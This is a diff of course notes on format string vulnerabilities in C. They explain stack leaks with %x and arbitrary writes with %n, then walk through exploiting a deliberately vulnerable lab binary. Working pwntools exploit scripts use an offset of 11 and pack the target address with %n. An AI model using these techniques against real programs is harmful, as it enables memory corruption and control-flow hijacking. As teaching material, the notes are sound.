@@ -7,11 +7,11 @@ author: Juan Luis Herrero Estrada
 challenges: format0 format1 format2 format3 format4
 ---
 
-In these notes, we introduce the concept of **string format vulnerabilities**
+In these notes, we introduce the concept of **format string vulnerabilities**
 and describe how they can be used to both leak information from memory and
-modify *arbitrary* locations with *arbitrary* values. In short, string format
-vulnerabilities offer opportunities beyond what is possible for a simple buffer
-overflow.
+modify *arbitrary* locations with *arbitrary* values (i.e., a write-what-where
+primitive). In short, string format vulnerabilities offer opportunities beyond
+what is possible for a simple buffer overflow.
 
 ### What Happens When the Attacker Controls the Format String
 
@@ -24,56 +24,111 @@ to print the value of those variables. Note: the information below also applies
 to other functions that use format strings, such as `sprintf` and `fprintf`.
 
 However, when there are more format specifiers than variables things can go
-wrong. In the worst case,  such a mistake might allow an attacker to read from
+wrong. In the worst case, such a mistake might allow an attacker to read from
 or write into arbitrary memory locations. 
 
 Consider the following 32-bit C program.
 
 ```c
-char buffer[64];
+#include<stdio.h>
 
-buffer = "%s %s";
+int main() {
+  char buffer[64] = "%s %s";
+
+  printf(buffer, "Hello", "World\n");
+}
+```
+The output of this program is:
+
+```
+Hello World
+```
+
+The first argument  passed to `printf` is the format string. In this example,
+`buffer` is the format string and it specifies that `printf` should substitute
+strings for the `%s` format specifiers; the specific strings are determined by
+the second and third arguments passed to `printf`.
+
+ 
+A quick look at the disassembly, and our prior knowledge of C calling
+conventions, tells us what arguments are passed to `printf` and how. 
+
+```
+0x080484aa <+63>:    push   0x8048560
+0x080484af <+68>:    push   0x8048567
+0x080484b4 <+73>:    lea    eax,[ebp-0x4c]
+0x080484b7 <+76>:    push   eax
+0x080484b8 <+77>:    call   0x8048330 <printf@plt>
+```
+
+In particular, the first two instructions push the third and second arguments
+to `printf` to the stack, i.e., the addresses of the `"Hello"` and `"World\n"`
+strings. Those strings are static values stored in the text section of the
+virtual address space.  The next two instructions setup and push the first
+argument, i.e., the address of the `buffer` char array which contains the
+format string. 
+
+One interesting property of `printf` is that it can be called with a variable
+number of arguments. For example, we could have modified the call to only use
+two arguments as follows:
+
+```c
+printf("%s", "Hello");
+``` 
+
+In other words, when `printf` executes, it does not immediately know how many
+arguments were passed to  the function. To determine how many arguments it was
+passed,  `printf` must parse the format string.  But what happens when the
+format string is wrong?  For example, consider the following code:
+
+```c
+char buffer[64] = "%s %s";
 
 printf(buffer);
 ```
 
 In this program, `printf` is only passed a single argument: the address of the
-string `%s %s`. The libc function will parse this string, see the format
+string `%s %s`. The `printf` function will parse this string, see the format
 specifiers calling for two additional strings to be printed, and look for the
-addresses of those two strings on the stack. Of course, no such strings exist.
-So printf will grab the four bytes from the stack for each non-address (based
-on where those addresses should be placed if they were passed as arguments)
-and, most likely, cause a segmentation fault when those pointers are
-dereferenced. 
+addresses of those two strings on the stack. However, no such strings exist
+and, consequently, `printf` will grab the four bytes from the stack from where
+the string addresses should be placed and treat those as string addresses. Most
+likely, `printf` will trigger a segmentation fault when those invalid pointers
+are dereferenced. 
+
 
 Let's consider a slightly altered version of this program:
 
 ```c
-char buffer[64];
-
-buffer = "%x %x";
+char buffer[64] = "%x %x";
 
 printf(buffer);
 ```
 
 Like before, `printf` will look for the (missing) arguments on the stack, but
-this time, the output would be the hexadecimal representation of the next two
-arguments as if those arguments were unsigned integers. In other words, if an
-attacker can supply the format specifier of "%x", then she can *leak the value
-of memory values on the stack.* While such memory leaks may seem of little
-consequence, these leaks can provide the attacker with the information she
-needs to bypass defenses like stack canaries and ASLR! 
+this time the format string contains a different pair of format specifiers,
+`%x`. This specifier tells `printf` to print the hexadecimal representation of
+the two arguments as if those arguments were unsigned integers.
+
+Now let's switch over to thinking like an attacker. If an attacker can control
+the format string passed to `printf`, change that format string to contain the
+`%x`  format specifier, then she can *force the program to print values from
+stack memory.* While such memory leaks may seem of little consequence, these
+leaks can provide the attacker with the information she needs to bypass
+defenses like stack canaries and ASLR! 
+
 
 ### Using Format Strings to Enable Arbitrary Writes 
 
-The problem extends beyond leaking memory. In particular, `printf` has another
-interesting format character, `%n`, which *writes* the number of characters
-printed by `printf` prior to reaching the `%n` to an address specified by the
-next argument.  To make this behavior more concrete, consider the following
-code:
+The format string problem extends beyond leaking memory. In particular,
+`printf` has another interesting format specifier, `%n`, which *writes* the
+number of characters printed by `printf` prior to reaching the `%n` to an
+address specified by the next argument.  To make this behavior more concrete,
+consider the following code:
 
 ```c
 int value;
+
 printf("what's my age again??? %n \n", &value);
 printf(value = %d\n", value)
 ```
@@ -85,23 +140,34 @@ what's my age again???
 value = 23
 ```
 
-The value of 23 is exactly the number of characters preceding the `%n` in the 
-string `what's my age again??? %n \n`.
+The value of 23 is number of characters preceding the `%n` in the string
+`what's my age again??? %n \n`. Keep in mind that `%n` records the number of
+characters printed to the screen, not necessarily the number of characters in
+the format string itself. Other `printf` formatting features can influence the
+number of characters printed to the screen.  
 
 In the previous example we provided the address of the `value` variable, but
-what if we left off this argument? Well, `printf` will interpret the word at
-the appropriate location on the stack as the address argument,  try to write to
-the location specified by this address,  and most likely trigger a segmentation
-fault. 
+what if the programmer forgot to include this argument? For example:
 
+```c
+printf("what's my age again??? %n \n");
+```
+
+
+This is essentially the same scenario we discussed previous with our strings
+example: `printf` will parse the format string, see the `%n`, interpret the
+word at the appropriate location on the stack as the address argument, try to
+write to the location specified by this address, and most likely trigger a
+segmentation fault. 
 
 At this point you might be thinking: "Hmmm, if I can control the format string
 argument to `printf`, and I can leverage that ability to also control  how many
-characters are written via `printf`, then all I need to do is control the
-address written to by `%n` and I have a write-what-where vulnerability." You
-would be correct. We already know how powerful a write-what-where vulnerability
-can be for an attacker, e.g., we can hijack the control-flow by targeting the
-global offset table.
+characters are written via `printf`. Consequently, I can write an arbitrary
+value via `%n`. Further, if I can control values on the stack, then I can
+control the address written to by `%n`. In short, I have a write-what-where
+primitive." If you were thinking this, then you would be correct. We already
+know how powerful a write-what-where vulnerability can be for an attacker,
+e.g., she can hijack the control-flow by targeting the global offset table.
 
 ### Simple Example
 
@@ -115,63 +181,85 @@ Consider how we might exploit a binary with the following C code:
 
 int target;
 
-void vuln(char *string)
-{
-  printf(string);
+void vuln(char *s) {
+  printf(s);
   
   if(target) {
       printf("you have modified the target :)\n");
   }
 }
 
-int main(int argc, char **argv)
-{
+int main(int argc, char **argv) {
   vuln(argv[1]);
 }
-```
-
-We can see that `printf(string)` might be our attack vector as the first (and
-only argument) to `printf` is a string that we (the attacker) control.    Let's
-try to apply some of the knowledge we gained from above. 
-
-If we run the binary using `$ ./binary "%x %x %x %x"`, we get the result `1
-c2f7ea48fb ffffd5ee` indicating that the program does have a format string
-vulnerability and that vulnerability will allow us to (at the very least) leak
-memory. 
-
-Let's print out more of the stack by running the binary with a slightly
-different argument: 
 
 ```
 
-./binary "`python -c "print  'AAAA' + 'BBBB' +'%x ' * 200"`"
-
-```
-
-We should see that the output looks something like the following:
-
-`41410031 42424141 78254242 20782520 25207825 78252078 20782520`
-
-If we interpret this hex characters as ascii, then we get:
+Let's try to apply some of the knowledge we gained from above.  Let's focus on
+the line `printf(s)` in function `vuln()`. The `s` argument is a
+value that we (as the attacker) control. Further, because it is the first
+argument to `printf`, `s` is treated as a format string by `printf`. In
+short, this looks like a format string vulnerability. 
+ 
+To confirm, let's write out a pwntools script that provides the binary with a
+format string that prints out values on the stack:
 
 ```python
 from pwn import *
-print unhex("41410031 42424141 78254242 20782520 25207825 78252078 20782520".replace(' ', ''))
 
->>> 'AA\x001BBAAx%BB x% % x%x% x x% '
+context.clear(arch="i386")
 
+p = process("./vuln")
+p.sendline('aaaa' + ' %x'*15)
+p.interactive()
 ```
 
-If we account for transposition due to alignment and endianness, this string
-looks like part of our input.  In other words, we managed to leak enough memory
-to find our own input string on the stack!
+We should see output similar to the following:
+
+```
+aaaa 40 f7fc25a0 0 f7ffd000 f7ffd918 ffffd280 ffffd374 0 ffffd314 f7fc2000 61616161 20782520 25207825 78252078 20782520
+```
+
+We can take the end of this sequence of hex characters and write code to
+interpret these values as ascii as follows:
+
+```python
+from pwn import *
+
+print unhex("61616161 20782520 25207825 78252078 20782520".replace(' ',''))
+```
+
+When run, this code will give us: 
+
+```
+aaaa x% % x%x% x x%
+```
+
+If we account for transposition due to alignment and endianness (remember that
+we are telling `printf` to treat successive sets of four bytes as unsigned
+integers), this string looks like part of our input.  In other words, we
+managed to leak enough memory to find our own input string on the stack!
+Specifically, the 11th `%x` specifier printed out the start of our input
+string.
+
+Let's clean this code up just a bit, using some additional features of `printf`, to only
+print out the first four bytes of our input string:
+
+```python
+p = process("./vuln")
+p.sendline('aaaa' + ' %11$x')
+p.interactive()
+```
+
+If we change the `%11$x` to `%11$n`, `printf` will attempt to write to the
+number of printed characters to the address 0x61616161, i.e., `aaaa`. 
 
 At this point, we know:
  1) this program has a format string vulnerability,
- 2) we have complete control over the format string, and 
+ 2) we have control over the format string, and 
  3) we can control some values on the stack.
 
-If we use "%n" as part of our input and  are clever in how we construct our
+If we use "%n" as part of our input and are clever in how we construct our
 format string, then we can directly control where on the stack `printf` looks
 for the `%n` address argument. That is, we can control the address of the write.
 For this challenge, we want to change the value of the global variable `target`
@@ -179,23 +267,24 @@ and, thus, we want our `%n` to trigger a write to `target`. Fortunately, we do
 not need to worry about what value gets written there (as long as it is not
 zero).  
 
-There are many way to figure out the address of `target`---for example
-`objdump -t binary | grep target`---but let's assume the variable is at 
-location `0x806d0fe`
+There are many ways to figure out the address of `target`---for example
+`objdump -t binary | grep target`---but let's use another pwntools feature to
+help us. 
 
-Now let's add our address to our input string, taking endianness into account,
-and we have something like: 
+Putting it all together, we have the following solution:
 
+```python
+b=ELF("./vuln")
+
+log.info("target at: " + hex(b.symbols.target))
+
+exploit_str = pack(b.symbols.target) + ' %11$n'
+
+p = process("./vuln")
+p.sendline(exploit_str)
+p.interactive()
 ```
-./binary "`python -c "print  'AAAA' + '\xfe\xd0\x06\x08' +'%x ' * 200 + '%n'"`"
-```
-
-The final step is figuring out how many '%x' format specifiers need to be used
-in the input string to have `printf` look for the argument for '%n' at the same
-location on the stack that we've placed the address of `target`. This process
-might take a bit of guess-and-check and maybe some leading padding too (e.g.,
-those 'A' characters at the start). 
-   
+ 
 
 ### Preventing Format String Vulnerabilities 
 
@@ -261,7 +350,6 @@ int main() {
   printf("\nCount: %d %x\n", count, count);
 }
 ```
-
 
 
 ### Other Resources on the Topic 
